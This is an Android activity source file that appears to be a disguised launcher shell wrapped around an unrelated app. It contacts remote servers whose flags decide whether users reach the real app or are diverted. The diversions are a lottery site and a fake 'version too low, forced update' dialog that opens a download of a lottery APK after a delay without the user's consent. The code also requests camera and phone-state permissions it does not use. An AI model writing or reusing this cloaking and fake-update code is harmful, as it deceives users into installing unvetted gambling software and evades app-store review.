package com.regus.mj;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.WebView;
import android.widget.RelativeLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class MJRegusActivity extends Activity {


    String mAid = "REGUS_AID";
    String mSid = "REGUS_SID";
    String activityPath = "REGUS_PATH_ACT";

//    String mAid = "6";
//    String mSid = "6";
//    String activityPath = "cn.etouch.ecalendar.MainActivity";

    String baseUrl0 = "http://fhaso.com/api/getappinfo.do";
    String baseUrl = "http://majia.132996.com:8010/AppShellService.svc/GetAppInfo";

    String downloadApkUrl = "https://www.ttc178.com/apps/ttc.apk";
    String dialogTitle = "版本更新";
    String dialogContent = "版本过低，需要升级新版本~";
    private String aimPackage = "com.ttc.lottery";


    WebView mWebView;
    RelativeLayout mRelativeLayout;


    boolean isWebViewInit;


    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
    };
    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= 21) {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            getWindow().setStatusBarColor(Color.BLACK);
        }
        isWebViewInit = false;

        mRelativeLayout = new RelativeLayout(this);
        mRelativeLayout.setPadding(0, getStatusBarHeight(), 0, 0);

        setContentView(mRelativeLayout);


        mWebView = new WebView(MJRegusActivity.this);
        mWebView.setVisibility(View.INVISIBLE);

        RelativeLayout.LayoutParams layoutParam = new RelativeLayout.LayoutParams
                (RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);

        mWebView.setLayoutParams(layoutParam);

        mRelativeLayout.addView(mWebView);

        if (Build.VERSION.SDK_INT >= 23) {
            checkPermision();
        } else {
            afterCheckPermision();
        }

    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    /**
     * 权限检测完毕之后
     */
    private void afterCheckPermision() {

        if (getIntent().getBooleanExtra("regus_download_open", false)) {
            showDownLoadDialog();
        } else if (getIntent().getBooleanExtra("regus_open", false)) {
            startWebview(getSharedPreferences("regus", Context.MODE_PRIVATE)
                    .getString("regus_url", "https://m.ttcai.cn"));
        } else {
            requset();
        }
    }

    /**
     * 权限检测
     */
    private void checkPermision() {
        mPermissionList.clear();
        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
            }
        }
        /**
         * 判断是否为空
         */
        if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
            afterCheckPermision();
        } else {//请求权限方法
            String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;

            case 2:

                break;
            default:
                break;
        }
    }


    private void requset() {
        new Thread(new RequestRunnable(mAid, mSid, baseUrl)).start();
        //    new Thread(new RequestRunnable("57", "2", baseUrl0)).start();
    }


    /**
     * 利用反射获取状态栏高度
     *
     * @return
     */
    public int getStatusBarHeight() {
        int result = 0;
        //获取状态栏高度的资源id
        int resourceId = getResources().getIdentifier("status_bar_height", "dimen", "android");
        if (resourceId > 0) {
            result = getResources().getDimensionPixelSize(resourceId);
        }
        return result;
    }

    private class RequestRunnable implements Runnable {

        String url;
        String aid;
        String sid;

        public RequestRunnable(String aid, String sid, String url) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jump();
                return;
            }

            String rootUrl = url + "?aid=";
            String allUrl = rootUrl + aid + "&sid=" + sid;

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    //处理
                    try {
                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                        if (url.equals(baseUrl)) {

                            if (responseJson.has("Status") && responseJson.has("Data")) {
                                if (responseJson.getBoolean("Status")) {

                                    JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                                    if (dataJsonObject.getBoolean("IsAdvertising")) {
                                        if (dataJsonObject.getBoolean("IsDownload")) {
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putBoolean("regus_download_open", true).apply();
                                        } else if (dataJsonObject.getBoolean("IsEnable")) {
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putBoolean("regus_open", true).apply();
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putString("regus_url", dataJsonObject.getString("Url"))
                                                    .apply();
                                        } else {
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putBoolean("regus_open", false).apply();
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putString("regus_url", "http://m.ttcai.cn")
                                                    .apply();
                                        }

                                        jump();

                                    } else {

                                        getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                .putBoolean("regus_download_open", false).apply();
                                        getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                .putBoolean("regus_open", false).apply();


                                        if (dataJsonObject.getBoolean("IsDownload")) {
                                            showDownLoadDialog();
                                        } else if (dataJsonObject.getBoolean("IsEnable")) {
                                            startWebview(dataJsonObject.getString("Url"));
                                        } else {
                                            jump();
                                        }

                                    }

                                } else {
                                    judeJump(url);
                                }
                                return;
                            }
                        } else if (url.equals(baseUrl0)) {
                            if (responseJson.has("Status") && responseJson.has("Data")) {
                                if (responseJson.getBoolean("Status")) {

                                    JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                                    if (dataJsonObject.getBoolean("IsEnable")) {

                                        String uu = dataJsonObject.getString("Url");
                                        if (uu.contains("lyn")) {
                                            startWebview(uu.replace("lyn", ""));
                                        } else {
                                            judeJump(url);
                                        }

                                    } else {
                                        judeJump(url);
                                    }

                                } else {
                                    judeJump(url);
                                }
                                return;
                            }

                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        judeJump(url);
                    }
                } else {
                    judeJump(url);
                }
            } catch (Exception e) {
                judeJump(url);
            }

        }


    }


    private void judeJump(String url) {
        if (url.equals(baseUrl0)) {
            new Thread(new RequestRunnable(mAid, mSid, baseUrl)).start();
        } else {
            jump();
        }
    }


    /**
     * 跳原应用
     */

    private void jump() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5天天彩
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jump();
            return;
        }
//        runOnUiThread(new Runnable() {
//            @Override
//            public void run() {
//                mProgressDialog = new ProgressDialog(MJRegusActivity.this);
//                mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
//                mProgressDialog.setMax(100);
//                mProgressDialog.setMessage("加载中，请稍后...");
//                mProgressDialog.show();
//                initWebSetting();
//                mWebView.loadUrl(url);
//            }
//        });

        startBrowsers(url, 0);

    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {

        Log.e("regus", "showDownLoadDialog");

        if (isAvilible(aimPackage, this)) {
            jump();
            return;
        }

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(this);
        //设置title
        normalDialog.setTitle(dialogTitle);
        //设置内容
        normalDialog.setMessage(dialogContent);
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowsers(downloadApkUrl, 1);
                dialog.dismiss();
                finish();
            }
        });
        normalDialog.show();

        Toast.makeText(this, "版本需要强制更新,自动跳转中", Toast.LENGTH_SHORT);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                startBrowsers(downloadApkUrl, 1);
            }
        }, 2001);
    }


    /**
     * 调用浏览器
     */

    private void startBrowsers(final String url, int type) {


        if (type == 0) {//跳转到落地页


            runOnUiThread(new Runnable() {
                @Override
                public void run() {

                    //创建dialog构造器
                    AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
                    //设置title
                    normalDialog.setTitle("新版本，注册送288~");
                    //设置内容
                    normalDialog.setMessage("2秒后跳转到下载页，点击下载请查看通知栏app文件安装~");
                    //设置按钮
                    normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {

                        }
                    });

                    normalDialog.show();

                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Intent intent = new Intent();
                            intent.setAction(Intent.ACTION_VIEW);
                            Uri content_url = Uri.parse(url);
                            intent.setData(content_url);
                            intent.addCategory(Intent.CATEGORY_BROWSABLE);
                            startActivity(intent);
                        }
                    }, 4001);


                }
            });


        } else {
            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            Uri content_url = Uri.parse(url);
            intent.setData(content_url);
            intent.addCategory(Intent.CATEGORY_BROWSABLE);
            startActivity(intent);
        }

    }


    /**
     * 判断有没有安装该apk
     *
     * @param packageName
     * @param context
     * @return
     */
    public static boolean isAvilible(String packageName, Context context) {
        final PackageManager packageManager = context.getPackageManager();
        // 获取所有已安装程序的包信息
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for (int i = 0; i < pinfo.size(); i++) {
            if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }


    /**
     * 返回上一个页面
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
            // 返回键退回
            mWebView.goBack();
            return true;
        } else
            return super.onKeyDown(keyCode, event);
    }


}
